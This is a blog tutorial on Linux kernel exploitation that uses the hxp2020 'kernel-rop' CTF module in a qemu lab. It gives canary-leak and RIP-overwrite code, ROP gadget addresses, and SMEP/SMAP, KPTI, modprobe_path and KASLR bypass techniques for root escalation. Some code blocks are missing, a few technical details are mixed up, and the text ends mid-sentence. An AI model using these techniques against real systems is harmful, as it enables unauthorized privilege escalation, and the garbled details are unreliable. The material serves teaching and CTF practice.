# Prelude

This blog post documents my forays into Linux kernel exploitation.
The basis for this introduction is a challenge from the hxp2020 CTF called `kernel-rop`.
If you want to follow along, you can either download it from [the CTF page](https://2020.ctf.link/) or from a [local mirror]({{ site.url }}/assets/2024-12-17-introduction-to-linux-kernel-exploitation/kernel-rop-bf9c106d45917343.tar.xz).

There are already a lot of solutions to this challenge on the internet. If you came to my blog by looking for such a solution, you may be disappointed.
This article is rather about Linux kernel exploitation in general and uses the challenge only as an example.
The reason why I chose especially that challenge is that it seemed to be a good entrance to kernel exploitation.

At the end of this article you will know how common security
mitigations in the kernel work and how to circumvent them.
We are using qemu as emulator for the kernel and are writing an
exploit for a custom kernel module.
This setup is pretty common and the bug is easy to spot.

I used drafts of this blog post (and exercises derived thereof) to
teach a workshop about linux kernel exploitation at my current
company. I want to thank my colleagues for their valuable feedback
which resulted in me rewriting some parts of this blog post, and also
in enough pressure, to finally finish this post.

# Setup

First, we unpack the .tar.gz from the CTF and take a look at the relevant files.

- `vmlinuz` - This contains the actual Linux kernel image.
- `initramfs.cpio.gz` - this contains the initial ramdisk. This is the
  filesystem that was compressed using cpio and gzip.
- `run.sh` - This file contains the qemu command to run the vm.

What follows is a more in-depth view of the various files.

## vmlinuz

This is the Linux kernel image. We can find out the version using `file`.

```
$ file vmlinuz
vmlinuz: Linux kernel x86 boot executable bzImage, version 5.9.0-rc6+ (martin@martin) #10 SMP Sun Nov 22 16:47:32 CET 2020, RO-rootFS, swap_dev 0X7, Normal VGA
```

The terminology here is that the z at the end indicates that it is
compressed. This is usually done with gzip, bzip or lzma. The
decompressed image is then called `vmlinux`.
Decompression can be performed using [a script from the linux
kernel](https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux)
that is also locally mirrored [here]({{ site.url }}/assets/2024-12-17-introduction-to-linux-kernel-exploitation/extract-vmlinux).

## initramfs.cpio.gz

This is the initial ramdisk. It is gzipped and cpioed. gzip is a
compression algorithm and should be known. cpio is an archival
algorithm like tar. I encountered it back in the days when I was
working as Linux sysadmin. It is a historic format, but is still used
here.

We can unpack this using `cat initramfs.cpio.gz | gunzip | cpio
--extract`. Probably we have to do this multiple times, so I found the following script.

{% highlight Bash %}
#!/bin/bash
mkdir initramfs
pushd . && pushd initramfs
cp ../initramfs.cpio.gz .
cat initramfs.cpio.gz | gunzip | cpio -i && rm initramfs.cpio
popd
{% endhighlight %}

The content of the file system is shown in the following.

```
$ tree
.
├── bin
│   ├── busybox
│   └── sh -> busybox
├── etc
│   ├── init.d
│   │   └── rcS
│   ├── inittab
│   ├── motd
│   └── resolv.conf -> /proc/net/pnp
├── hackme.ko
├── init -> bin/busybox
├── root
├── sbin
└── usr
    ├── bin
    └── sbin
```

This is a Linux file system. motd contains a fun banner. hackme.ko is
a kernel module that is vulnerable and needs to be hacked.

The file `/etc/init.d/rcS` contains the following important parts.
{% highlight Bash %}
....
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
chmod 400 /proc/kallsyms

insmod /hackme.ko
chmod 666 /dev/hackme
{% endhighlight %}

The command `echo 1 > /proc/sys/kernel/kptr_restrict` obscures the
kernel pointers that are exposed via `/proc` and other
interfaces. Basically it means that kernel pointers are "usually"
replaced by zeroes.

The command `echo 1 > /proc/sys/kernel/dmesg_restrict`
restricts
unprivileged users from issuing `dmesg` to view the kernel log. We
could set this to `0` to ease debugging.

The next line `chmod 400 /proc/kallsyms` sets restrictions to the file
`/proc/kallsyms`. This file contains the kernel symbols and thus
read access could be used to get valid pointers to the kernel address space.

Next, the vulnerable kernel module is loaded into the kernel using
`insmod /hackme.ko`.

The command `chmod 666 /dev/hackme` sets the permissions on the device
`/dev/hackme`. This is probably a device that serves as an interface
to the vulnerable kernel module `hackme.ko`. Hence, the goal of the
challenge is probably to read and write to that device and pwn the
kernel in this way.

The file `/etc/inittab` contains the command `setuidgid 1000 sh;` This
gives us a shell for the normal user. We can modify this to `setuidgid
0 sh` in order to get a root shell. If we boot the modified initramfs,
we can then access files that are helpful in debugging the exploit
such as `/proc/kallsyms` that contains the symbols of the kernel or
`/sys/module/core/sections/.text` that contains the address of the
`.text` section of the kernel.

We will have to compile an exploit, include it in initramfs,
compress initramfs and then run the kernel. Then we have to test the
exploit and if it does not work, do all the steps again. So here is a
script to automate compilation, inclusion in initramfs and compressing initramfs.
This script was found [here](https://gist.github.com/brant-ruan/b67dc2fbae150e7bc76fda914816f534).

{% highlight Bash %}
#!/bin/bash

# Compress initramfs with the included statically linked exploit
in=$1
out=$(echo $in | awk '{ print substr( $0, 1, length($0)-2 ) }')
gcc $in -static -o $out || exit 255
mv $out initramfs
pushd . && pushd initramfs
find . -print0 | cpio --null --format=newc -o 2>/dev/null | gzip -9 > ../initramfs.cpio.gz
popd
{% endhighlight %}

## run.sh

This script runs the kernel and the initramfs within qemu. Its
commented content is as follows.

{% highlight Bash %}
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \                     # the memory size
    -cpu kvm64,+smep,+smap \      # cpu model and enabling some mitigations
    -kernel vmlinuz \             # the kernel image
    -initrd initramfs.cpio.gz \   # the initial ramdisk
    -hdb flag.txt \         # use this file as harddisk image /dev/hdb
    -snapshot \             # write to temporary files and not disk images
    -nographic \            # disable graphical output. only command line
    -monitor /dev/null \    # redirect the monitor
    -no-reboot \            # exit instead of rebooting
    -append "console=ttyS0 kaslr kpti=1 quiet panic=1"
            # this last line specifies some boot options
{% endhighlight %}

As some of these arguments enable Kernel security mitigations, it is
a natural next step in this exposition. Note that we can modify the
mitigations within this command in order to have an easier time
exploiting the kernel module.

But first a digression regarding remote debugging. If we append `-s`
to the list of arguments, then qemu enables remote debugging on port
1234.
We can connect to this port using the gdb debugger with the command
`target remote localhost:1234`.
If we add `-S` to the list of arguments of qemu, then the kernel is
started in a suspended state. Within gdb, we can attach to this and
start the kernel using `continue` or simply `c`. This allows debugging
the kernel. This information is just for the sake of completeness.
We do not make use of remote debugging in the remainder of this
article.

# Kernel Security Mitigations

As the `run.sh` script contained options that enable Kernel security
mechanisms, we will next talk about these.

- `Kernel ASLR (Address Space Layout Randomization)` - This is similar to ASLR in the user space. The objects in the kernel are loaded at random addresses in order to prevent using known offsets to jump to known function pointers.
- `SMEP (Supervisor Mode Execution Prevention)` - All userland memory pages in the kernel are marked as non-executable when a process is in kernel mode. This prevents using code from user space in kernel exploits. If we want to have arbitrary code execution in the kernel, we need to reuse code that is already inside the kernel (i.e., using a ROP-chain with gadgets in the kernel). SMEP is enabled by setting the `20th bit of the CR4 control register` of the processor.
- `SMAP (Supervisor Mode Access Prevention)` - Similar to SMAP. It marks all userland memory pages as non-readable and non-writable when execution is in kernel land. While the other mitigations are common to Windows and Linux, SMAP is not implemented in Windows. Like SMAP, SMEP is enabled by setting the `21st bit of the CR4 control register` of the processor.
- `KPTI (Kernel Page Table Isolation)` - This is a further enhancement of SMEP/SMAP. User land and kernel land memory tables are isolated. One set of memory pages tables is used for running in kernel mode. This contains both user mode and kernel mode pages. A second set of memory page tables is used when running in user mode. It contains the full user land pages and a minimal needed set of kernel mode memory pages.


# Reconnaissance

After we have our setup, a natural next step is looking at the
vulnerability that we are going to exploit. We already know that it is
residing within the `hackme.ko` kernel module. Hence, let us take a
look at its properties.

```
$ rabin2 -I hackme.ko
arch     x86
baddr    0x8000000
binsz    317877
bintype  elf
bits     64
canary   true
injprot  false
class    ELF64
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
nx       false

pic      false
relocs   true
relro    no
rpath    NONE
sanitize false
static   true
stripped false
subsys   linux
va       true
```

We can see that stack canaries are enabled in the kernel module. This
is a mitigation against exploitation of buffer overflows. A fake value
is inserted in the stack and when a function returns, the canary is
checked for modifications. Modification corresponds to the detection
of an exploit attempt and the kernel crashes the program.

Disassembling the kernel module, e.g., using Ghidra or r2 reveals
multiple functions.

```
$ r2 -A initramfs/hackme.ko
...
 -- Remember to maintain your ~/.radare_history
[0x08000064]> afl
0x08000070    1     13 sym.hackme_release
0x08000080    8    174 sym.hackme_write
0x08000140    1     13 sym.hackme_open
0x08000150    5    174 sym.hackme_read
0x08000207    1     23 sym.hackme_init
0x0800021e    1     18 sym.hackme_exit
```

The functions `hackme_init`, `hackme_exit`, `hackme_open`, `and
`hackme_release` are necessary for a kernel module. They are
needed for loading and unloading the kernel module.

The function `hackme_read` is executed, when we read from
`/dev/hackme`.
The function `hackme_write` is executed, when we write to
`/dev/hackme`.

Decompiling `hackme_read` using again Ghidra or r2 reveals the
following.

{% highlight C %}
ssize_t hackme_read(file *f,char *data,size_t size,loff_t *off)

{
  long lVar1;
  size_t sVar2;
  long in_GS_OFFSET;
  undefined local_a8 [8];
  int tmp [32];

  tmp._120_8_ = *(undefined8 *)(in_GS_OFFSET + 0x28);
  __memcpy(hackme_buf,local_a8);
  if (0x1000 < size) {
    __warn_printk("Buffer overflow detected (%d < %lu)!\n",0x1000,size);
    do {
      invalidInstructionException();
    } while( true );
  }
  __check_object_size(hackme_buf,size,1);
  lVar1 = _copy_to_user(data,hackme_buf,size);
  sVar2 = 0xfffffffffffffff2;
  if (lVar1 == 0) {
    sVar2 = size;
  }
  if (tmp._120_8_ == *(long *)(in_GS_OFFSET + 0x28)) {
    return sVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
{% endhighlight %}

There is a 32-byte array on the stack `tmp[32]`, but we can read
up to `0x1000=4096` bytes. Thus, it allows to read further and hence
leak the stack.

The function `hackme_write` is very similar. It allows to write up to
`0x1000` bytes into a 32-byte array on the stack. Hence it allows to
overflow the stack.

# Leaking the Stack

As we can leak the stack using ``hackme_read`, we can also
read the stack canary token.
Our code is based on [this awesome
writeup](https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/).

We prepare a file called `leak_stack.c`. This can be compiled and
packed in the initramfs using the script shown above in the setup
paragraph.

{% highlight C %}
#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char *VULN_DRV = "/dev/hackme";

int64_t global_fd = 0;

void open_dev() {
    global_fd = open(VULN_DRV, O_RDWR);
    if (global_fd < 0) {
        printf("[-] failed to open %s\n", VULN_DRV);
        exit(-1);
    } else {
        printf("[+] successfully opened %s\n", VULN_DRV);
    }
}


void leak_stack() {
    uint8_t sz = 40;
    uint64_t leak[sz];
    printf("[*] trying to leak up to %ld bytes memory\n", sizeof(leak));
    uint64_t data = read(global_fd, leak, sizeof(leak));
    for (int offset=0; offset < sz; offset++){
        printf("[+] offset %d contains value: 0x%lx \n", offset, leak[offset]);
    }
}


int main(int argc, char **argv) {
    open_dev();
    leak_stack();

    return 0;
}
{% endhighlight %}

Then, we can execute `run.sh` to start the kernel and drop into a
shell within the qemu environment. If we included the compiled
`leak_stack.c` correctly, we should find it in the root folder.

Its output looks as follows.
```
$ ./leak_stack

[+] offset 38 contains value: 0xffffffffa6e0a157
```

When looking at the stack, we can see three types of entities. There
are arguments to functions at offset 1 and 5. Then, there are
addresses starting with 0xffff. Thirdly, there are stack canaries.
such as the one at offset 2, 16, or 30. Apparently, the one at offset
2 is a part of the uninitialized memory from the variable `tmp[32]` and
not a canary, even though it looks like one.

[This tutorial](https://blog.wohin.me/posts/linux-kernel-pwn-01/)
computes the offset of the stack canary simply through reverse
engineering.
[This
tutorial](https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/)
detects the stack canary automatically by assuming that it does not
start with `ffff` and ends in `00`.

# Controlling RIP

As a next step, we want to check if we can control the instruction
pointer RIP.
As mentioned above, we can overwrite the stack using the function
`hackme_write`. When this function is done, the stack is unwound.
This means, that the previous stack context has to be recovered.
RBX and RBP are so-called callee-saved registers. Hence, they have to be
restored from the stack. Further, R12 is popped. I don't know what R12 is good for, or why that happens, but this is the way things are.
Finally, the instruction pointer RIP is popped.

So we can construct a payload and write it to `/dev/hackme`.

{% highlight C %}
#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char *VULN_DRV = "/dev/hackme";

int64_t global_fd = 0;
uint64_t cookie = 0;
uint64_t cookie_off = 16;


void open_dev() {
    global_fd = open(VULN_DRV, O_RDWR);
    if (global_fd < 0) {
        printf("[-] failed to open %s\n", VULN_DRV);
        exit(-1);
    } else {
        printf("[+] successfully opened %s\n", VULN_DRV);
    }
}


void leak_cookie() {
    uint8_t sz = 40;
    uint64_t leak[sz];
    printf("[*] trying to leak up to %ld bytes memory\n", sizeof(leak));
    uint64_t data = read(global_fd, leak, sizeof(leak));
    cookie = leak[cookie_off];
    printf("[+] leaked cookie 0x%lx at offset %d \n", cookie, cookie_off);
}

void control_rip() {
    uint8_t sz = 40;
    uint64_t payload[sz];
    payload[cookie_off++] = cookie;
    payload[cookie_off++] = (uint64_t) 0x4444444444444444;  // RBX
    payload[cookie_off++] = (uint64_t) 0x4343434343434343;  // R12
    payload[cookie_off++] = (uint64_t) 0x4242424242424242;  // RBP
    payload[cookie_off++] = (uint64_t) 0x4141414141414141;  // RIP
    write(global_fd, payload, sizeof(payload));
    puts("if you can read this, it did not work.");
}


int main(int argc, char **argv) {
    open_dev();
    leak_cookie();
    control_rip();

    return 0;
}
{% endhighlight %}

Again, we need to compile, compress the exploit into initramfs and
start it with qemu using run.sh.

We can clearly see that we control the return address RIP, as it
contains `0x4141414141414141`. This is so far with all mitigations still
enabled.
However, as we are in kernel mode it is not immediately clear how to
exploit this fact.

# Privilege Escalation Without Any Mitigations: Ret2Usr

In order to make out life easier, let us first disable the security
mechanisms and try to exploit it. We can later add the security
mechanisms again and built up to the full challenge.

Within run.sh instead of the last line `-append "console=ttyS0 kaslr
kpti=1 quiet panic=1"` we write `-append "console=ttyS0 nosmep nosmap
nopti nokaslr quiet panic=1"` in order to disable SMEP/SMAP, as well
as KASLR and KPTI.

Now, we only have the stack canary to take care of. This is similar to
userland exploitation with ROP chains. In userland, the goal is usually to spawn an
elevated shell. In the kernel, it is the same.

There are two functions in the kernel, that are usually used
for elevating privileges.

- `prepare_kernel_cred()` - This kernel function prepares a set of
    credentials for a kernel service and can also override the
    credentials of a task for delegation purposes. If we call this
    with `0` as argument, the returned credentials have no group and
    full capabilities.
- `commit_creds()` - This kernel function installs new credentials in
    the current thread.

Hence, the goal is to call `commit_creds(prepare_kernel_cred(0))`
using a ROP chain.

We can find the addresses of these functions inside the kernel by
checking `/proc/kallsyms`. For this we modify `/etc/inittab` in the
initramfs to contain `setuidgid 0 sh`. This will drop us to a root
shell, so we are allowed to read `/proc/kallsyms`. Don't forget to
undo these changes, or you will wonder later why your privilege
escalation always works without doing anything.

{% highlight Bash %}
# id
uid=0 gid=0 groups=0
# cat /proc/kallsyms | grep -e prepare_kernel_cred -e commit_creds
ffff ffff 814c6410 T commit_creds
ffff ffff 814c67f0 T prepare_kernel_cred
{% endhighlight %}

So we have the addresses that we need to put on the ROP chain.

After elevating our privileges, we need to go back to user land.
For this we need the assembly instruction `swapgs` with either `iretq`
or `sysretq`.

- `swapgs` - GS is one of the segment registers, such as `CS` (Code
  Segment), `DS` (Data Segment), or `SS` (Stack Segment). These registers
  point to the respective sections in the binary. The `CS` register
  points to the code segment in the binary, i.e., `.text`. The `DS`
  register points to the data segment `.data` in the binary and so
  on. When a context switch from user mode to kernel mode or back
  takes place, these registers just need to point to different memory
  addresses in order to facilitate this change. `FS` and `GS` are special
  registers in the CPU that can also be used for this context switch
  but whose purpose is not specified by the CPU manufacturer and thus
  can be chosen by the programmers of the operating system. `FS` and `GS`
  are used by Linux and Windows to access thread specific storage. As
  an example, in Windows, the Thread Environment Block (TEB) can be
  found at a fixed offset from `GS` or `FS`, depending on if the
  architecture is 32 or 64 bit. To make a long story short, we must
  swap the GS register when entering user mode from kernel mode or
  vice versa.
- `iretq/sysretq` - Either of these functions need to be used to
  perform the actual context switch between kernel and user
  mode. `iretq` is easier to use, as it only requires the stack to be
  setup up with five registers for the userland in the order `RIP`,
  `CS`, `RFLAGS`, `SP`, `SS`.
  For `sysretq` we need to move the return address that should be in
  `RIP` in `RCX`. Further, `sysretq` moves `RFLAGS` to `R11`. The bits
  48 to 63 of the register `RIP` need to be the same as bit
  46. Otherwise, we get a general protection fault.

Executing these two instructions can be performed in our exploit code
using inline assembly. We do not even need a ROP chain for that, as we
have disabled SMEP/SMAP and thus can craft our chain inside user mode.

Note that when we revert back to user mode with `iretq/sysretq` we need
to set the registers. Hence, before doing this dance, we have to store
the userland registers in order to be able to revert them later.

This can be done as follows.
{% highlight C %}
uint64_t user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}
{% endhighlight %}

Now we can put everything together. The following code is the full
exploit for a kernel without any mitigations except stack canaries.

Executing this code looks as follows.

[+] leaked cookie 0x2aa741ea8a7daa00 at offset 16
[+] we are root (uid = 0)
/ # id
uid=0 gid=0
```

As we see the message `[+] we are root (uid = 0)` in the output of our
exploit, the elevation of privileges worked.

Note that in the payload we could instead of
`execl("/bin/sh", "sh", NULL);` also write
`system("/bin/sh");`. This solution can be found in different
writeups, but in my tests, it did not work and lead to a segmentation
fault. I have no idea why this does not work.
If you read this and know why it happens, please let me know. I will
edit this section when i find it out.

# Adding SMEP/SMAP
Next, we will add the mitigations SMEP/SMAP and again try to exploit the kernel module.
Remember that SMEP/SMAP stands for Supervisor Mode Access/Execution
Prevention and marks memory pages from userland as
non-accessible/executable, as long as we are in kernel mode.
Hence, our exploit will not work
anymore, as the inline assembly we wrote lives in user space, but we
execute it from kernel mode. SMAP marks these pages as non-executable.

To enable SMEP/SMAP, we modify the last line of the original `run.sh`
as follows: `-append "console=ttyS0 nopti nokaslr quiet panic=1"`.

Running the previous exploit yields an error message.

```

The important part is `[4.726632] unable to execute userspace code
(SMEP?) (uid: 1000)`.
Well, we are doing kernel exploitation. The error messages are not
getting any clearer than this.

In previous kernel versions up to around 2019 it was possible to disable SMEP/SMAP
by using the kernel function `native_write_cr4()`. As SMEP and SMAP
are activated by setting the 20th and 21st bit in the CR4 control
register of the processor, it was possible to set those bits to zero
and hence disable SMEP/SMAP. However, this was patched by pinning the
bits so they cannot be changed anymore. Hence, this game plan does not
work anymore.

Instead, we will craft a ROP chain using gadgets from the kernel
only. This ROP chain will perform
`commit_creds(prepare_kernel_cred(0))`, `swapgs`, and `iretq`.
First we create a list of all gadget inside the
kernel. Extract vmlinuz to vmlinux, as explained in the setup
instructions above.
There are multiple tools that can be used to extract ROP gadgets from vmlinux.
[ROPGadget](https://github.com/JonathanSalwan/ROPgadget)
(`pip install ROPGadget`) can be used with the command `ROPgadget --binary vmlinux > gadgets.txt` to find the
gadgets. However, it does not seem to find gadgets containing `iretq`.
There is also [ropr](https://github.com/ben-lichtman/ropr) (`cargo install ropr`) that is invoked using `ropr --nouniq vmlinux > gadgets.txt`
We can also filter gadgets using, e.g., `ropr --nouniq -R '^iretq' vmlinux`
Note that some of the gadgets that are found do not work as they are in memory that is marked as non-executable.

All that is left is creating a fake stack with the functions that we
want to have executed. We then write to the device `hackme.ko` and
overwrite the real stack with our fake stack. When the stack is
unwound, our functions are executed.

Note that in the x64 calling convention, the arguments to functions
are given in registers. The register RDI contains the first argument
of a function. Hence, we write the value 0 in RDI and then call
`prepare_kernel_cred`. The result is then returned in the register
RAX, again according to the x64 calling convention.

## Alternative way of bypassing SMEP but not SMAP
You may have noticed, that we bypassed both SMEP and SMAP.
By building the ROP chain only from kernel gadgets, we did not
need to either execute or access memory pages from user mode.
But there are alternative approaches that can bypass SMEP, but not
SMAP, one of which I want to touch on here. The idea is to pivot the
stack to a location where we can write
our ROP chain to. This is useful in the case where we can overwrite
only the return address but not further.

There are a bunch of ROP gadgets that move a constant value into
ESP.
One such gadget is as follows.
{% highlight C %}
uint64_t mov_esp_pop2_ret = 0xffffffff8196f56a; // mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret
{% endhighlight %}
One could use this gadget as the return address when overflowing the
buffer of the vulnerable device. Before, one needs to write the
remainder of the ROP chain to the address that is moved to ESP. This
can be achieved by allocating the region using mmap.

The idea works if SMEP is enabled, as we do not need to execute anything
in userland. However, it does not work when SMAP is enabled, as we
need read and write access to the location where we pivot to, i.e., to a user
land memory page.

I saw this idea in [this other
writeup](https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/).

We need to modify `run.sh` to disable SMAP and enable SMEP using the command line arguments `-cpu kvm64,+smep`.

The full code for the exploit is shown below.

# Adding KPTI
Next, we will add Kernel page-table isolation (KPTI).

For this we edit `run.sh` to include `-append "console=ttyS0 kpti=1
nokaslr quiet panic=1"`.

KPTI is a mechanism to isolate kernel page tables from user space. In
user space only the necessary page tables from the kernel are mapped
that allow to switch to kernel mode.

Thus, if we execute the previous exploit, we get a segmentation fault,
instead of a kernel panic. This happens, as the system tries to access
pages from the kernel while in user mode that are not mapped anymore.

The following ASCII art illustrates the results of KPTI.

```

I have read about three ways to bypass KPTI

- **Using a signal handler**: Here, a signal handler for the
  segmentation fault is registered that will execute the payload with
  root privileges.
- **KPTI Trampolines**: The kernel needs to contain a functionality
  for changing from kernel mode to user mode. This function called a
  KPTI trampoline is still mapped in memory, even when we are in user
  mode and hence can be  used to return to the user space, without our
  hacky `swapgs` and `iretq` gadgets.
- **Abusing modprobe**: The kernel has a reference to the path of the binary
  `modprobe`. Under some circumstances, the variable at this path is
  executed. If the path is overwritten, and the circumstances are
  achieved, then the file at the path is executed. This execution
  happens with kernel privileges.

## KPTI Bypass 1: Using a Signal Handler
This is probably the easiest way to circumvent KPTI.
Remember that if we execute the previous exploit, we get a
segmentation fault. We can register a signal handler that handles the
segmentation fault and executes the payload.
The segmentation fault occurs after the elevation of privileges, when
the switch back to user mode with `iretq` is performed. Hence, we only
need to prevent the process from crashing.
Instead of executing the payload, the registered function to handle
the segmentation fault could simply do nothing.

Adding a signal handler can be performed by including the line
`signal(SIGSEGV, payload);` within the `main` function. Further, we
need to include the respective headers using `#include <signal.h>`.

These are really the only changes that need to be made. But for
the sake of completeness here is the full code.

## KPTI Bypass 2: KPTI Trampolines

This is the idea that you can find in most writeups on bypassing
KPTI. The main idea is that if a syscall returns normally, then there
is a piece of code that achieves this.
This code is called a KPTI trampoline and changes the memory page
tables from kernel space to user space.
It will swap the page tables and then execute `swapgs` and `iretq`,
just like we did manually.
In Linux this function is called
`swapgs_restore_regs_and_return_to_usermode`, and we can find its
position by looking for it in the kallsyms. Note that we need
administrative privileges for that.

{% highlight Bash %}
# cat /proc/kallsyms | grep swapgs_restore_regs_and_return_to_usermode
ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode
{% endhighlight %}

Disassembling this function with radare2 can be done as shown below.

```

The `swapgs` and `iretq` can be found in the last call and the jmp.
Apparently, this small stub is still mapped in memory, even when we are in
user mode, as it is necessary to leave the kernel. I do not exactly
know, why this cannot be removed and needs to be accessible from user
mode, but apparently that is how things are. Hence, we can use it to
bypass KPTI.

The plan is to jump to
`swapgs_restore_regs_and_return_to_usermode+22`, as that is the part
where the push operations begin. Note that at the start of
`0xffffffff81200f89` there are two additional pop instructions that we
have to take care of.

What is left is to exchange the `swapgs` and `iretq` in our ROP chain
with `swapgs_restore_regs_and_return_to_usermode+22` and two dummy
arguments that will be popped to RAX and RDI.

## KPTI Bypass 3: Abuse Modprobe

The binary `modprobe` is used to add or remove modules from the kernel.
Its path is stored in a global kernel variable that can be accessed in
`/proc/sys/kernel/modprobe` and usually defaults to
`/sbin/modprobe`. Further, a reference to this variable called
`modprobe_path` can be found
in the kernel symbols accessible using `/proc/kallsyms`, as it is a
kernel variable.

The game plan is to overwrite the path of modprobe with a filename of
a file containing custom commands. Overwriting `modprobe_path` can be
performed using a ROP chain. The file containing the custom commands
can be created any way you like. The final execution of the file
referenced using `modprobe_path` and hence our commands, can be
performed by calling `execve` on a binary that has no format handler
specified.

The whole procedure is reminiscent of the fine intricacies of a
theater play, albeit with actors that have strange names.

I will spare you the details and the code, but if you want to know more, you can find more information [in paragraph
"Version 3: Probing the mods" of this writeup](https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/).

There are also other so-called user mode helpers in addition to modprobe that
can be used in a similar way. As an example, the file
`/proc/sys/kernel/core_pattern` contains the command that is used to
create coredumps. This can again be overwritten to point to an evil
binary and then a coredump can be triggered to execute the evil binary..


# Adding KASLR

Next, let us add KASLR back by adding `-kaslr` to `run.sh` so we have `-append "console=ttyS0 kpti=1 kaslr quiet panic=1"`.

## Preliminaries
To understand KASLR, let us first start with [Address Space Layout Randomization (ASLR)](https://en.wikipedia.org/wiki/Address_space_layout_randomization).
ASLR is an exploit mitigation in user space that prevents building
reliable ROP gadgets. This was added to Linux around 2005. The main
idea is to randomize the memory space,
such that the ROP gadgets are at different addresses in different runs
and thus cannot be reliably jumped to. There are various
implementations, some only randomize the `.text` section, some
also randomize the stack, heap, and libraries.

Usually, the way to bypass ASLR is to get an address leak. If only the
base address of the loaded executable is randomized, then the offsets
are still the same in multiple runs. Hence, from an address leak the
relative offsets of the ROP gadgets can be calculated and hence, ASLR
could be bypassed.

Kernel ASLR (KASLR) is basically ASLR, but in kernel mode. This was
merged to Linux around 2014 in version 3.14. Back in the days this
loaded the kernel at a random base address, but left the offsets
intact. This old version can be activated using the options `kaslr`
and `nofgkaslr` in `run.sh`.

In 2021, [Function Granular KASLR
(FGKASLR)](https://lwn.net/Articles/824307/) was introduced which is a
finer grained kernel address space randomization. In particular, the
kernel code is rearranged per function. Hence, even when a kernel
address leak exists, it is hard to exploit, as computing the relative
offsets does not work anymore.

## Reconnaissance
The introduction of KASLR breaks all our previously developed
exploits, as it changes the addresses of the ROP gadgets.

There are two places where we can start our investigation.
We can leak the stack and compare how it changes between different
runs.
Or we can modify `initramfs/etc/inittab` to give us a root shell so we
can read `/proc/kallsyms` and compare the
addresses of the kernel symbols between multiple runs.

### Investigating the Stack
We already developed `leak_stack.c` above which allows us to read the
stack.
We executed this file two times and stored the output in `stack1.txt`
and `stack2.txt`.
Comparing the two outputs using `diff stack1.txt stack2.txt` yields
the following.

```diff

> [+] offset 15 contains value: 0xffffa424c01bfea0
> [+] offset 16 contains value: 0x310671060c9fe500
....
```

We can see, that some addresses are similar in both runs. E.g., on
offset 15 we had `0xffffaa5a001bfea0` and `0xffffa424c01bfea0`. The
last three and a half bytes are the same: `01bfea0`.

If we squint hard enough, we can also see which lines are the same in
both files.
Another approach is using the `comm` command, which gives us immediately
the lines that are the same in both files, but unfortunately only
works on sorted inputs.

```
$ comm -12 <(sort stack1.txt) <(sort stack2.txt)
[*] trying to leak up to 320 bytes memory
[+] offset 1 contains value: 0x2a
[+] offset 13 contains value: 0x0
[+] offset 17 contains value: 0x140
[+] offset 18 contains value: 0x0
[+] offset 24 contains value: 0x140
[+] offset 25 contains value: 0x0
[+] offset 29 contains value: 0x0
[+] offset 32 contains value: 0x0
[+] offset 33 contains value: 0x0
[+] offset 34 contains value: 0x0
[+] offset 39 contains value: 0x0
[+] offset 5 contains value: 0x4
[+] successfully opened /dev/hackme
```

Here, we see that all values that stay the same are parameters and not
addresses.

If we leak more values from the stack, we learn some more values that
are similar between different runs.
In particular we are interested in offsets that start with the same
value. The idea is that the leaked values describe the randomized base address
added to a fixed offset. As the fixed offset is the same across
multiple runs, we can compute the address of valuable functions, if we
know their distance to a leaked value, as the distance stays the same.

How do we know if a function is valuable? We can search for it in
`/proc/kallsyms` and if it corresponds to a symbol, it may be
valuable, as we can compute offsets from that symbol.

As an example, if we set the lower two bytes of the value at the stack
offset 38 to zero, we arrive at the base address of the kernel.

```
/ # ./leak_stack | grep 38
[+] offset 38 contains value: 0xffffffffa680a157
/ # grep ffffffffa6800000 /proc/kallsyms
ffffffffa6800000 T _text
ffffffffa6800000 T startup_64
ffffffffa6800000 T _stext
```

Another useful stack leak is at offset 41. Setting the lower bytes to
zero yields again the address of a symbol in the kernel table.

```
/ # ./leak_stack | grep 41
[+] offset 41 contains value: 0xffffffffa6a0008c
[+] offset 53 contains value: 0x417421
[+] offset 58 contains value: 0x417421
/ # grep ffffffffa6a00000 /proc/kallsyms
ffffffffa6a00000 T native_usergs_sysret64
ffffffffa6a00000 T __entry_text_start
```

Note that we could now start to rebuild our ROP chain, by computing
the base address of the kernel from the stack offset 38. The addresses
of the ROP gadgets can then be computed by their offset from the
kernel base address.
For the old implementation of ASLR, i.e. for KASLR that is not FGKASLR this works.

We need to set `nofgkaslr` in `run.sh`.
Then, the following code implements the attack on simple KASLR that
only adds a random offset to the kernel base address.

[+] leaked prepare_kernel_cred 0xffffffffb3ec67f0
[+] leaked ksymtab_commit_creds 0xffffffffb3ec6410
[+] we are root (uid = 0)
```

The next step is dealing with full FGKASLR. Thus, the randomization takes
place on the granularity of functions.

### Comparing Addresses of Kernel Symbols
After investigating the stack, let us now compare the location of
kernel symbols for different runs.
For this, we need to modify `initramfs/etc/inittab` to give us a root shell so we
can access `/proc/kallsyms`.

We execute `run.sh` and then take a look at `/proc/kallsyms`.
For this, we needed to [increase the size of the scroll buffer of
bash](https://stackoverflow.com/questions/24795285/increase-shell-buffer-size-in-linux)
so we could simply `cat /proc/kallsyms` and copy the output.
Then, we did this again.

Comparing the locations of the kernel symbols for these two runs,
e.g., using `vimdiff` shows that FGKASLR does not apply to the whole
